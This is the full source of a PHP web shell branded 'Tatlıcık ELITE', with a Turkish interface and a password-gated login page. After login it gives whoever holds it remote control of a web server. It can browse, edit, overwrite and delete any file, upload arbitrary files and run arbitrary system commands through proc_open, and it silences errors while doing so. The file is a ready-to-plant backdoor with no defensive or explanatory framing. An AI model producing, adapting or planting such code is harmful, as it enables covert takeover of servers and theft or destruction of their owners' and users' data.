<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

$auth_pass = "fd41ac418cc86aade915a32c573adfd2";

function b64e($s){ return base64_encode($s); }
function b64d($s){ return base64_decode($s); }

if(!isset($_SESSION['ws_auth'])){
    if(isset($_POST['ws_p']) && md5($_POST['ws_p']) == $auth_pass){ 
        $_SESSION['ws_auth'] = true; 
        header("Location: " . $_SERVER['PHP_SELF']); exit;
    } else { 
        die('<!DOCTYPE html><html><head><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-[#020617] flex items-center justify-center h-screen"><form method="post" class="bg-[#0f172a] p-8 rounded-2xl border border-purple-900/50 shadow-2xl flex flex-col gap-4 text-center"><img src="https://cdn.discordapp.com/emojis/1421156132327657484.webp?size=96&animated=true" class="w-20 h-20 mx-auto mb-4"><input type="password" name="ws_p" class="bg-[#020617] text-purple-400 border border-purple-900/50 p-3 rounded-lg outline-none focus:border-purple-500 w-72" placeholder="Tatlı Access"><button type="submit" class="bg-purple-600 hover:bg-purple-500 text-white font-bold py-3 rounded-xl transition uppercase text-xs tracking-widest">Sisteme Giriş</button></form></body></html>'); 
    }
}

$cd = isset($_GET['d']) ? b64d($_GET['d']) : getcwd();
$cd = realpath($cd);
chdir($cd);

if(isset($_FILES['up_f'])){
    $target = $cd . DIRECTORY_SEPARATOR . basename($_FILES['up_f']['name']);
    if(move_uploaded_file($_FILES['up_f']['tmp_name'], $target)){
        header("Location: ?d=".b64e($cd)."&up=ok"); exit;
    }
}

function x($c){
    $o = "";
    if(function_exists('proc_open')){
        $ds = array(1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $p = proc_open($c, $ds, $ps);
        if(is_resource($p)){
            $o = stream_get_contents($ps[1]) . stream_get_contents($ps[2]);
            fclose($ps[1]); fclose($ps[2]); proc_close($p);
        }
    }
    return $o ?: "No output.";
}

if(isset($_POST['sv'])){ file_put_contents(b64d($_POST['fn']), $_POST['ct']); }
if(isset($_GET['dl'])){ unlink(b64d($_GET['dl'])); header("Location: ?d=".b64e($cd)); exit; }
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <title>Tatlıcık ELITE v4.1</title>
    <style>
        body { background-color: #020617; color: #a78bfa; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(8px); border: 1px solid rgba(139, 92, 246, 0.15); }
    </style>
</head>
<body class="p-4">
    <div class="max-w-7xl mx-auto space-y-4">
        <div class="glass p-4 rounded-3xl flex items-center justify-between border-b-2 border-purple-900/30 shadow-2xl">
            <div class="flex items-center gap-4">
                <img src="https://cdn.discordapp.com/emojis/1421156132327657484.webp?size=96&animated=true" class="w-12 h-12">
                <h1 class="text-xl font-black text-white italic">Tatlıcık<span class="text-purple-600">ELITE</span></h1>
            </div>
            <span class="text-[10px] text-zinc-500 font-mono"><?= php_uname() ?></span>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-4">
            <div class="lg:col-span-9 space-y-4">
                <div class="glass p-3 rounded-xl text-[10px] font-mono flex items-center overflow-x-auto whitespace-nowrap">
                    <i class="bi bi-folder-fill mr-2 text-purple-600"></i>
                    <?php 
                    $ps = explode(DIRECTORY_SEPARATOR, $cd); $acc = "";
                    foreach($ps as $p){ if($p == "") continue; $acc .= DIRECTORY_SEPARATOR . $p; echo "<a href='?d=".b64e($acc)."' class='hover:text-white'>$p</a><span class='mx-1 opacity-40'>/</span>"; } 
                    ?>
                </div>

                <?php if(isset($_GET['f'])): $fp = b64d($_GET['f']); ?>
                    <div class="glass p-6 rounded-3xl">
                        <div class="flex justify-between items-center mb-4"><span class="text-xs font-bold text-purple-400">FILE: <?= basename($fp) ?></span><a href="?d=<?= b64e($cd) ?>" class="text-red-500 font-bold text-xs">CANCEL</a></div>
                        <form method="post">
                            <input type="hidden" name="fn" value="<?= b64e($fp) ?>">
                            <textarea name="ct" rows="20" class="w-full bg-black/60 p-5 rounded-2xl text-[11px] font-mono border border-purple-900/20 outline-none focus:border-purple-600 text-zinc-300"><?= htmlspecialchars(file_get_contents($fp)) ?></textarea>
                            <button name="sv" class="mt-4 bg-purple-600 text-white px-8 py-3 rounded-xl font-black text-xs uppercase shadow-xl hover:bg-purple-500 transition">SAVE CHANGES</button>
                        </form>
                    </div>
                <?php else: ?>
                    <div class="glass rounded-3xl overflow-hidden shadow-xl">
                        <table class="w-full text-[11px] text-left">
                            <thead class="bg-purple-950/20 text-purple-400 uppercase font-black italic">
                                <tr><th class="p-4">Name</th><th class="p-4">Size</th><th class="p-4 text-right">Action</th></tr>
                            </thead>
                            <tbody class="divide-y divide-purple-900/5">
                                <?php
                                $is = scandir($cd);
                                foreach($is as $i){
                                    if($i == "." || $i == "..") continue;
                                    $p = $cd.DIRECTORY_SEPARATOR.$i; $is_d = is_dir($p);
                                    echo "<tr class='hover:bg-purple-900/10 group'>";
                                    echo "<td class='p-3 flex items-center'><i class='bi bi-".($is_d?"folder-fill text-yellow-500":"file-earmark-text text-purple-600")." mr-3 text-lg'></i><a href='?d=".b64e($is_d?$p:$cd).($is_d?"":"&f=".b64e($p))."'>$i</a></td>";
                                    echo "<td class='p-3 opacity-40'>".($is_d?"DIR":round(filesize($p)/1024,2)."K")."</td>";
                                    echo "<td class='p-3 text-right'><a href='?dl=".b64e($p)."&d=".b64e($cd)."' class='text-red-500 opacity-0 group-hover:opacity-100 transition' onclick=\"return confirm('Delete?')\"><i class='bi bi-trash3-fill'></i></a></td>";
                                    echo "</tr>";
                                }
                                ?>
                            </tbody>
                        </table>
                    </div>
                <?php endif; ?>
            </div>

            <div class="lg:col-span-3 space-y-4">
                <div class="glass p-5 rounded-3xl shadow-xl">
                    <h3 class="text-xs font-black uppercase text-purple-500 mb-3 italic text-center tracking-widest">Upload</h3>
                    <form method="post" enctype="multipart/form-data">
                        <label class="w-full flex flex-col items-center px-4 py-6 bg-black/40 text-purple-400 rounded-2xl border-2 border-dashed border-purple-900/40 cursor-pointer hover:border-purple-600 transition">
                            <i class="bi bi-cloud-arrow-up-fill text-2xl animate-bounce"></i>
                            <input type="file" name="up_f" class="hidden" onchange="this.form.submit()">
                        </label>
                    </form>
                    <?php if(isset($_GET['up'])) echo "<p class='text-[10px] text-green-500 text-center mt-2 font-bold'>UPLOAD SUCCESS!</p>"; ?>
                </div>

                <div class="glass p-5 rounded-3xl space-y-3 shadow-xl">
                    <h3 class="text-xs font-black uppercase text-purple-500 italic text-center tracking-widest">Terminal</h3>
                    <form method="post"><input name="c" class="w-full bg-black/40 border border-purple-900/20 p-3 rounded-xl text-[10px] outline-none focus:border-purple-600" placeholder="ls -la"><button class="w-full bg-purple-900/40 py-2 rounded-xl mt-2 text-[10px] font-bold uppercase hover:bg-purple-600 transition">EXECUTE</button></form>
                    <?php if(isset($_POST['c'])){ echo "<pre class='text-[9px] bg-black p-3 rounded-xl text-green-500 overflow-x-auto mt-2 border border-green-900/30'>".htmlspecialchars(x($_POST['c']))."</pre>"; } ?>
                </div>
            </div>
        </div>
        <div class="text-center opacity-5 text-[8px] font-black uppercase tracking-[1em] py-4">Tatlıcık Elite Clean Build</div>
    </div>
</body>
</html>
